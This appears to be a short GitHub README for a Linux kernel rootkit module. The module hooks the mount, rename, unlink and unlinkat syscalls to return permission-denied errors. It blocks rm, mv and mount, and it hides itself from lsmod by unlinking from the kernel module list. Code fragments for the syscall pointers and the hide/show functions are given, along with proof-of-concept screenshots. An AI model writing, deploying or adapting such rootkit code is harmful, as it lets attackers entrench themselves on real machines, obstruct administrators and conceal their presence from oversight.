This Lkm created by Devil0x1 , which hook mount unlink and unlink at also rename which block commands like rm mount mv.
Works in Versions 4.x
```#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/mutex.h>
#include <linux/uaccess.h>
```
This all are needed libraries 


``` static asmlinkage long (*real_sys_mount)(const char __user *source, const char __user *target,
                                         const char __user *filesystemtype, unsigned long flags,
                                         const void __user *data);
static asmlinkage long (*real_sys_rename)(const char __user *oldname, const char __user *newname);
static asmlinkage long (*real_unlink)(const char __user *pathname);
static asmlinkage long (*real_unlinkat)(int dfd, const char __user *pathname, int flag);```


Above are just the real syscalls pointers


So , we hooked an mount , rename , unlink , unlinkat and return -EPERM error to show permission denied errors :) eg:
``` return -EPERM``



```void module_show(void) {
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void module_hide(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}
```

  Simple , functions which first shows hide from lsmod and show at lsmod 


  POC:

  <img width="520" height="173" alt="image" src="https://github.com/user-attachments/assets/54460af4-ac5a-4bd0-9a5b-603f0c9c8ea0" />



  Here perm denied errors hehe :
<img width="632" height="91" alt="image" src="https://github.com/user-attachments/assets/1913ec80-dbaf-4de8-8e25-a13e2b1e14cc" />






